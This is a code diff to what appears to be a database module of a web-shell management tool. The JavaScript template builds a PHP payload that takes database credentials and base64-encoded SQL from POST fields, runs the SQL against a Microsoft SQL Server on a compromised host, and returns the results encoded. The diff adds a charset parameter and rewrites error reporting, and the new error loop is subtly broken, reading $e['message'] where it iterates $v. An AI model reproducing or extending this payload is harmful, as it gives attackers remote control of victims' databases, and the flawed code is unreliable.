@@ -77,7 +77,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
-      $chs='utf-8';
+      $chs=strtolower($m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"]);
+      $chs=($chs=='utf-8'||$chs=='char')?$chs:'utf-8';
       $T=@sqlsrv_connect($hst,array("UID"=> $usr,"PWD"=>$pwd,"Database"=>$dbn,"CharacterSet"=>$chs));
       $q=@sqlsrv_query($T,$sql,null);
       if($q!==false){
@@ -102,7 +103,14 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         }
         @sqlsrv_free_stmt($q);
       }else{
-        echo("Status\t|\t\r\n".base64_encode(sqlsrv_errors()[0]['message'])."\t|\t\r\n");
+        echo("Status\t|\t\r\n");
+        if(($e = sqlsrv_errors()) != null){
+          foreach($e as $v){
+            echo(base64_encode($e['message'])."\t|\t\r\n");
+          }
+        }else{
+          echo("RmFsc2U="."\t|\t\r\n");
+        }
       }
       @sqlsrv_close($T);`.replace(/\n\s+/g, ''),
     [arg1]: '#{host}',
@@ -110,6 +118,6 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
     [arg3]: '#{passwd}',
     [arg4]: '#{db}',
     [arg5]: '#{base64::sql}',
-    // [arg6]: '#{encode}'
+    [arg6]: '#{encode}'
   }
 })
